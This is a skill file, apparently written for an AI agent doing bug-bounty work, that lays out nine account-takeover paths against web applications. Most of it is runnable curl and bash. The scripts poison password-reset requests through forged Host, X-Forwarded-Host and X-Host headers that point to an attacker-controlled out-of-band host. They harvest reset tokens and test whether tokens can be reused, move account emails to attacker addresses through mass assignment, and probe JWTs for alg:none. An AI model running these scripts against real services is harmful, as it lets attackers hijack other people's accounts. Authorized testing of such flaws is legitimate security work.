---
name: k1nzr3c0n-hunt-ato
description: "Account Takeover hunting skill covering 9 ATO paths: password reset poisoning, token predictability, no-expiry tokens, email-change-no-reauth, JWT manipulation, password-change-no-stepup, social recovery abuse, SSO subdomain takeover, response manipulation. Each path requires full login-as-victim proof."
tags: [ato, account-takeover, hunt, web-security, bug-bounty]
report_count: 9
---

# K1NZR3C0N Hunt — Account Takeover (ATO)

> **Full ATO required**: must prove login as victim account. Partial access = IDOR, not ATO.
> **Token predictability**: need statistical analysis of n≥20 tokens to claim entropy weakness.

---

## Crown Jewels

```
Priority 1 — Password reset token predictable / no expiry / reusable
Priority 2 — Password reset poisoning (Host header → reset link goes to attacker)
Priority 3 — OAuth account linking CSRF (see hunt-oauth)
Priority 4 — Email change without re-authentication → token resent to new email
Priority 5 — Response manipulation: change status/role in response (client-side trust)
```

---

## Path 1 — Password Reset Poisoning

```bash
TARGET="${TARGET:-}"
echo "=== Password Reset Host Header Poisoning ==="

# Intercept reset email request, inject poisoned Host header
RESET_EP="${RESET_ENDPOINT:-https://${TARGET}/api/password/reset}"
VICTIM_EMAIL="${VICTIM_EMAIL:-victim@example.com}"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"

# Standard poisoning: override Host header
curl -sk -X POST "$RESET_EP" \
  -H "Host: ${OOB}" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"${VICTIM_EMAIL}\"}"

# X-Forwarded-Host override
curl -sk -X POST "$RESET_EP" \
  -H "X-Forwarded-Host: ${OOB}" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"${VICTIM_EMAIL}\"}"

# X-Host override
curl -sk -X POST "$RESET_EP" \
  -H "X-Host: ${OOB}" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"${VICTIM_EMAIL}\"}"

echo "  [!] Check OOB for reset link containing: $OOB"
echo "  Impact: attacker receives victim's reset link → full ATO"
```

## Path 2 — Reset Token Entropy & Expiry

```bash
echo "=== Password Reset Token Analysis ==="
RESET_EP="${RESET_ENDPOINT:-https://${TARGET}/api/password/reset}"

# Collect 20 tokens for entropy analysis
echo "Collecting 20 reset tokens..."
TOKENS=()
for I in $(seq 1 20); do
  # Request reset for controlled email
  RESP=$(curl -sk -X POST "$RESET_EP" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"attacker+${I}@attacker.com\"}" 2>/dev/null)
  TOKEN=$(echo "$RESP" | grep -oP 'token["\s:=]+["\x27]([^"\x27&\s]+)' | grep -oP '[^"\x27=]+$' | head -1)
  [ -n "$TOKEN" ] && TOKENS+=("$TOKEN") && echo "  Token $I: $TOKEN"
done

# Test expiry: use old token
echo ""
echo "Test token expiry (try 24h old token if captured):"
RESP=$(curl -sk -X POST "${TARGET}/api/password/reset/confirm" \
  -d "token=${OLD_TOKEN:-old_token_here}&password=NewP@ss123")
echo "  Response: ${RESP:0:100}"

# Test token reuse (use same token twice)
echo ""
echo "Test token reuse (use once, try again):"
RESP2=$(curl -sk -X POST "${TARGET}/api/password/reset/confirm" \
  -d "token=${TOKENS[0]:-}&password=NewP@ss123")
echo "  Second use: ${RESP2:0:100}"
```

## Path 3 — Email Change Without Re-auth

```bash
echo "=== Email Change Without Re-authentication ==="
# If email can be changed without current password → attacker steals account

# Method 1: Direct email change
curl -sk -X PUT "https://${TARGET}/api/user/email" \
  -H "Authorization: Bearer ${ACCT1_TOKEN:-}" \
  -H "Content-Type: application/json" \
  -d '{"email": "newemail@attacker.com"}' | python3 -m json.tool 2>/dev/null | head -5

# Method 2: PUT vs PATCH method swap
curl -sk -X PATCH "https://${TARGET}/api/user" \
  -H "Authorization: Bearer ${ACCT1_TOKEN:-}" \
  -H "Content-Type: application/json" \
  -d '{"email": "newemail@attacker.com"}' | python3 -m json.tool 2>/dev/null | head -5

# Method 3: Mass assignment (include email in profile update)
curl -sk -X PUT "https://${TARGET}/api/user/profile" \
  -H "Authorization: Bearer ${ACCT1_TOKEN:-}" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test User", "email": "newemail@attacker.com", "phone": "1234567890"}' \
  | python3 -m json.tool 2>/dev/null | head -5
```

## Path 4 — JWT Manipulation (See hunt-jwt for full detail)

```bash
echo "=== JWT-Based ATO ==="
# Decode and tamper with JWT to change user ID or role
TOKEN="${JWT_TOKEN:-}"
if [ -n "$TOKEN" ]; then
  # Decode without verification
  PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool)
  echo "JWT Payload: $PAYLOAD"
  
  # Check algorithm
  HEADER=$(echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null)
  echo "JWT Header: $HEADER"
  echo "$HEADER" | grep -qi '"alg":"none"' && echo "  [VULN] alg:none — signature stripped"
  echo "$HEADER" | grep -qi '"alg":"RS256"' && echo "  [TEST] RS256 → try HS256 key confusion"
fi
echo "  → /skill k1nzr3c0n-hunt-jwt for full JWT attack methodology"
```

## Path 5 — Response Manipulation

```bash
echo "=== Response Manipulation ==="
# Some apps check auth in response body/status — Burp intercept + modify response

echo "Intercept login response and change:"
echo "  {'success': false}  →  {'success': true}"
echo "  {'role': 'user'}    →  {'role': 'admin'}"
echo "  HTTP 401            →  HTTP 200"
echo "  {'active': false}   →  {'active': true}"
echo ""
echo "Client-side check bypass:"
grep -rhoP 'if\s*\([^)]{0,80}(?:isLoggedIn|isAuthenticated|isAdmin|role\s*===)[^)]{0,80}\)' \
  /tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded/*.js 2>/dev/null | head -10
```

## Path 6 — Social Recovery Abuse

```bash
echo "=== Social Recovery / Support Bypass ==="
echo "Test if support/recovery flow can be abused:"
echo ""
echo "1. 'Account recovery via email' — does it require proof of ownership?"
echo "2. 'Verify via SMS' — is OTP brute-forceable? (see hunt-auth-bypass)"
echo "3. 'Security questions' — enumerable answers?"
echo "4. 'Support ticket impersonation' — does support reset without verification?"
echo ""
echo "Check support email domain:"
curl -sk "https://${TARGET}/" | grep -oP 'support@[^\s<>"\x27]+|help@[^\s<>"\x27]+' | sort -u
```

## Gate 0

```bash
echo "=== ATO Gate 0 ==="
echo "  □ FULL ATO: can log in as victim user (not just view their data)"
echo "  □ Password reset poisoning: token received at OOB server (HTTP, not DNS)"
echo "  □ Email change: victim receives confirmation at NEW email (chain completed)"
echo "  □ JWT: forged token accepted, victim session active"
echo "  □ Evidence: screenshot of victim's account dashboard accessed from attacker browser"
echo "  □ Two accounts: victim and attacker are distinct registered users"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Password Reset Poisoning via Host header on [/api/password/reset] allows capturing victim's reset token
Account Takeover via email change without re-authentication on [/api/user/email]
ATO via expired/reusable password reset token — token valid for [Xh] and can be used multiple times
```
